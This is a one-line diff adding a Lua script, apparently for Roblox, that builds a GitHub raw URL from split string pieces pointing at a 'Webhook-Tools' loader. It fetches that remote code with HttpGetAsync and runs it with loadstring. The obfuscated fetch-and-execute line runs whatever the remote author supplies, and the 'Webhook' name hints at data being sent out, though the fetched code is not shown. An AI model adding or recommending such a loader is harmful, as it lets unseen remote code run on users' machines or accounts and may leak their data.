@@ -1,0 +1,1 @@
+local b,a,t,u,s = "juywvm","-Roblox-Projects-","main","Webhook-Tools","load";loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/%s/%s/%s/%s/%s"):format(b, a, t, u, s)))()
